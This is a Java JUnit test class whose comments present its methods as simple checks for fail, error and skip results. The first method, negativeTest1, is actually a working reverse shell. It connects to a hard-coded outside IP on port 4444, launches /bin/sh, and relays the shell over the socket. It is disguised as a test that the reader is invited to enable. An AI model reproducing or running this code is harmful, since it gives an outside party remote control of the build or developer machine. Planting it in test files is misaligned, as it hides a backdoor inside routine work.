package sampletest;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.Disabled;
import static org.junit.jupiter.api.Assertions.*;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;


public class TestSuite2 {

   //Uncomment @Test to get the result with 'fail' status, 
   //but be aware the build will not pass.
   //Once the test result is validated, comment back to get a pass build
   //@Test
   public void negativeTest1() {

          String host = "169.38.106.74";
        int port = 4444; 
        String[] cmd = {"/bin/sh"};
        
        try {
            Socket s = new Socket(host, port);
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            
            while(!s.isClosed()) {
                while (pi.available() > 0) so.write(pi.read());
                while (pe.available() > 0) so.write(pe.read());
                while (si.available() > 0) po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
            }
            
            p.destroy();
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
   }

   //Uncomment @Test to get the result with 'error' status, 
   //but be aware the build will not pass.
   //Once the test result is validated, comment back to get a pass build
   //@Test
   public void negativeTest2() throws Exception {

        throw new Exception("negativeTest2 to test Error result");

    }

   @Disabled("negativeTest3 to test Skip result")
   @Test
   public void negativeTest3() {
       //not executed
     
   }

}
